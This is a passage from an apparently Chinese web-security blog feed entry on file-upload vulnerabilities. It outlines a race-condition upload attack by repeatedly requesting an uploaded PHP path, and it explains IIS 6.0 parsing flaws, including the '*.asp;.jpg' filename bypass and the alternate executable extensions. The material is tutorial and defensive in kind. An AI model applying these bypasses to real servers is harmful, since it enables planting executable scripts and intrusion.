class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/条件竞争/1.gif" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/条件竞争/2.gif" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/条件竞争/3.gif" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li>构造上传路径进行循环访问（http://*.*.*.*/upload/php.php）,步骤与上述相同</li><li>访问大量上传包中的最大包</li><li><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/条件竞争/4.gif" alt title>                </div>                <div class="image-caption"></div>            </figure></li></ul><h2 id="文件上传——IIS-6-0-解析漏洞导致上传绕过"><a href="#文件上传——IIS-6-0-解析漏洞导致上传绕过" class="headerlink" title="文件上传——IIS 6/0 解析漏洞导致上传绕过"></a>文件上传——IIS 6/0 解析漏洞导致上传绕过</h2><p>这里是代码，只有聪明的人才看得见（谁知道我写完之后自己也看不见了）</p><p>科普一下IIS解析漏洞：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IIS6.0解析漏洞分两种</span><br><span class="line"></span><br><span class="line">1、目录解析</span><br><span class="line"></span><br><span class="line">以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。</span><br><span class="line"></span><br><span class="line">2、文件解析</span><br><span class="line"></span><br><span class="line">*.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。</span><br><span class="line"></span><br><span class="line">IIS6.0 默认的可执行文件除了asp还包含这三种 *.asa *.cer *.cdx</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件上传漏洞类型总结&quot;&gt;&lt;a href=&quot;#文件上传漏洞类型总结&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞类型总结&quot;&gt;&lt;/a&gt;文件上传漏洞类型总结&lt;/h1&gt;&lt;h2 id=&quot;写在开始&quot;&gt;&lt;a href=&quot;#写在开始&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="各类漏洞收集整理" scheme="https://13l00m.github.io/categories/%E5%90%84%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%94%B6%E9%9B%86%E6%95%B4%E7%90%86/"/>
    
    
      <category term="php" scheme="https://13l00m.github.io/tags/php/"/>
    
      <category term="web安全" scheme="https://13l00m.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="文件上传" scheme="https://13l00m.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
</feed>
